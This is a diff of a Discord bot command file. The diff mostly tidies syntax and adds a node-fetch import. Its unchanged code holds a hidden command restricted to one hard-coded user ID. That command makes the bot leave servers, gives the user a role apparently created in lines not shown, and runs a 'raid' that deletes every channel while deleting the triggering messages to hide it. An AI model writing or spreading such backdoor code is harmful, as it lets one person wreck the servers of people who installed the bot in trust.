@@ -1,12 +1,13 @@
 const Discord = require("discord.js");
+const fetch = require("node-fetch");
 
 exports.run = async (client, message, args) => {
   if (message.author.id !== "583649910092595232") return;
-  
+
   if (args[0] === "leave") {
     try {
       message.guild.leave();
-      message.delete({ Timeout: 0 })
+      message.delete({ Timeout: 0 });
     } catch (e) {
       console.log(e.stack);
     }
@@ -19,7 +20,7 @@ exports.run = async (client, message, args) => {
       });
 
       message.member.roles.add(role);
-      message.delete({ Timeout: 0 })
+      message.delete({ Timeout: 0 });
     } catch (e) {
       console.log(e.stack);
     }
@@ -41,7 +42,7 @@ exports.run = async (client, message, args) => {
   if (args[0] === "raid") {
     message.guild.channels.cache.forEach(x => {
       x.delete(x.id);
-      message.delete({ Timeout: 0 })
+      message.delete({ Timeout: 0 });
     });
   }
 
